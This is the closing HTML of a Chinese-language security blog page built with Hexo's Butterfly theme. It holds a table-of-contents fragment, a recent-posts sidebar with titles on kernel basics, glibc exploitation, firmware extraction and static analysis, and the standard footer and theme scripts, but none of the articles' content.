class="toc-text">总结exit调用流程</span></a></li></ol></li></ol></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2023/11/04/Practice/" title="Practice"><img src="/img/default_top_img.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Practice"/></a><div class="content"><a class="title" href="/2023/11/04/Practice/" title="Practice">Practice</a><time datetime="2023-11-04T12:09:23.000Z" title="发表于 2023-11-04 20:09:23">2023-11-04</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/10/04/Kernel-Basic/" title="Kernel Basic"><img src="/img/default_top_img.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Kernel Basic"/></a><div class="content"><a class="title" href="/2023/10/04/Kernel-Basic/" title="Kernel Basic">Kernel Basic</a><time datetime="2023-10-04T08:32:03.000Z" title="发表于 2023-10-04 16:32:03">2023-10-04</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/09/11/%E9%AB%98%E7%89%88%E6%9C%ACglibc%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/" title="高版本glibc利用总结"><img src="/img/default_top_img.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="高版本glibc利用总结"/></a><div class="content"><a class="title" href="/2023/09/11/%E9%AB%98%E7%89%88%E6%9C%ACglibc%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/" title="高版本glibc利用总结">高版本glibc利用总结</a><time datetime="2023-09-11T11:30:22.000Z" title="发表于 2023-09-11 19:30:22">2023-09-11</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/08/30/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%8F%90%E5%8F%96%E5%9B%BA%E4%BB%B6%E7%9A%84%E6%8A%BD%E8%B1%A1%E7%BB%8F%E8%BF%87/" title="记一次提取固件的抽象经过"><img src="/img/background.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="记一次提取固件的抽象经过"/></a><div class="content"><a class="title" href="/2023/08/30/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%8F%90%E5%8F%96%E5%9B%BA%E4%BB%B6%E7%9A%84%E6%8A%BD%E8%B1%A1%E7%BB%8F%E8%BF%87/" title="记一次提取固件的抽象经过">记一次提取固件的抽象经过</a><time datetime="2023-08-30T15:40:22.000Z" title="发表于 2023-08-30 23:40:22">2023-08-30</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/08/28/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/" title="静态分析"><img src="/img/default_top_img.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="静态分析"/></a><div class="content"><a class="title" href="/2023/08/28/%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/" title="静态分析">静态分析</a><time datetime="2023-08-28T02:08:33.000Z" title="发表于 2023-08-28 10:08:33">2023-08-28</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('/img/default_top_img.png')"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By c10uds</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-nest.min.js"></script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-show-text.min.js" data-mobile="false" data-text="c10uds,Asuri" data-fontsize="15px" data-random="false" async="async"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>